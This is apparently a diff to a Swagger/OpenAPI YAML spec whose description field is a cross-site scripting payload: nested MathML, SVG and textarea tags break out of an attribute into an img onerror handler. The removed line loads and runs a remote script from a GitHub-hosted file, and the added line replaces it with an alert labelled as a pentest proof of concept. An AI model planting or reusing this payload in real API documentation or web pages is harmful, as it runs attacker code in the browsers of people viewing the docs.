@@ -2,7 +2,7 @@ swagger: '2.0'
 info:
   title: Example yaml.spec
   description: |
-    <math><mtext><option><FAKEFAKE><option></option><mglyph><svg><mtext><textarea><a title="</textarea><img src='#' onerror=document.write('<script src=https://raw.githubusercontent.com/f0xtr07/f0xtr07.github.io/main/countBy.js">' + '</script>')>">
+    <math><mtext><option><FAKEFAKE><option></option><mglyph><svg><mtext><textarea><a title="</textarea><img src='#' onerror=alert('XSS by Pentest')>">
 paths:
   /accounts:
     get:
